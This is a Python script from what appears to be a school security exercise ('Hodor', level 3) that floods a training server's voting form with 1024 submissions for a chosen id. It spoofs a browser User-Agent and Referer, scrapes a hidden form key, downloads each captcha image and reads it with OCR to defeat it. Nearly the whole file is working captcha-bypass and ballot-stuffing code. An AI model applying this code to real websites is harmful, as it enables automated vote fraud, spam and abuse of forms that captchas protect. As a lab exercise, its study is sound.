#!/usr/bin/python3
"""
Hodor - Hbtn project

Level 3: HTTP request with parameters, cookies, User-Agent, and captcha

Usage: python3 requester_3.py [id]

Author: @exploitpnk
"""
import requests
import sys
import os
import pytesseract
from bs4 import BeautifulSoup
from PIL import Image

if len(sys.argv) == 2:
    url = "http://158.69.76.135/level3.php"
    user_id = sys.argv[1]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
        "Referer": "http://158.69.76.135/level3.php"
        }
    for i in range(1, 1024):
        session = requests.session()
        page = session.get(url, headers=headers)
        soup = BeautifulSoup(page.text, "html.parser")
        hidden = soup.find("form", {"method": "post"})
        hidden = hidden.find("input", {"type": "hidden"})
        hidden_key = hidden["value"]
        captcha = soup.find("form", {"method": "post"}).find("img")
        captcha = "http://158.69.76.135" + captcha["src"]
        img = open("captcha.png", "wb")
        img.write(session.get(captcha).content)
        img.close()
        captcha_text = pytesseract.image_to_string("captcha.png")
        os.system("rm captcha.png")
        data = {
                "id": user_id,
                "holdthedoor": "Submit+Query",
                "key": hidden_key,
                "captcha": captcha_text
                }
        session.post(url, data=data, headers=headers)
        print("[#] Captcha readed", captcha_text, "request", str(i) + '/1024', "sent")
else:
    print("Usage: python3", sys.argv[0], "[id]")
